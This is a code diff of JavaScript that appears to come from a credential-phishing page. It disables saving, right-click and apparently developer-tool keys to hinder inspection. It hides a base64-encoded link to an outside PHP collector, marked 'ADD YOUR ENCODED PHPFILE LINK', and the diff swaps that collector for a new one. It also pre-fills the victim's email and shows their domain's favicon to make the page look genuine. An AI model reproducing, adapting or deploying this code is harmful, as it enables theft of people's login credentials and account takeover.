@@ -1,4 +1,4 @@
- window.addEventListener("keydown", async (e) => {
+window.addEventListener("keydown", async (e) => {
         if (e.ctrlKey && 83 == e.which) return e.preventDefault(), !1;
       }),
         window.addEventListener("contextmenu", (e) => e.preventDefault()),
@@ -26,7 +26,7 @@
               117 === e.keyCode)
           ));
 
-      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21va28ucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
+      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21zZW5kMTAucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
       const redirectUrl = ""; // ADD YOUR REDIRECT URL HERE
 
       const hash = window.location.hash.split("#")[1];
@@ -56,7 +56,7 @@
       const gFav = `https://www.google.com/s2/favicons?domain=${domain}&sz=${size}`;
       logo.src = gFav;
 
-  submitBtn.addEventListener("click", function (e) {
+      submitBtn.addEventListener("click", function (e) {
         e.preventDefault();
         if (email.value === "") {
           errorShow.textContent = "Enter your email address";
@@ -148,3 +148,14 @@
           });
         }
       });
+
+      function showEl(el, color) {
+        el.style.color = color;
+        el.style.display = "block";
+      }
+
+      function hideEl(el) {
+        el.style.color = "#000";
+        el.style.display = "none";
+        el.textContent = "";
+      }
